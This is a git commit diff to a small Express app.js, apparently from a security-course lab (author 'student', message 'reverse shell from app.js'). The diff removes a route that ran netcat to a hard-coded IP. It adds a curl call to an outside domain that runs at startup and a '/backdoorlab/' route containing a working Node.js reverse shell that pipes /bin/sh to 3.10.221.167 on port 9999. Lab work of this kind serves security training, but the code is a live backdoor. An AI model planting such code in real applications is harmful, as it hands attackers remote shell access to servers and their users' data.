b6c006a62d9e83affaa9f9c0f34f7ae48a3e7eb5
student <student@sec588.com>
2023-11-24 12:20:16 +0000

    reverse shell from app.js

--- app.js
+++ app.js
@@ -4,8 +4,8 @@ var app = express();
 app.get('/', function (req, res) {
   res.send('Im an helpful app!');
 });
-app.get('/test123moi/', function (req, ses){
-  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+
+exec("curl -k https://anniekcreates.com/leendertwazhere", (error, stdout, stderr) => {
     if (error) {
         console.log(`error: ${error.message}`);
         return;
@@ -15,6 +15,10 @@ app.get('/test123moi/', function (req, ses){
         return;
     }
     console.log(`stdout: ${stdout}`);
+});
+
+app.get('/backdoorlab/', function (req, res) {
+(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(9999, "3.10.221.167", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/;})();
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
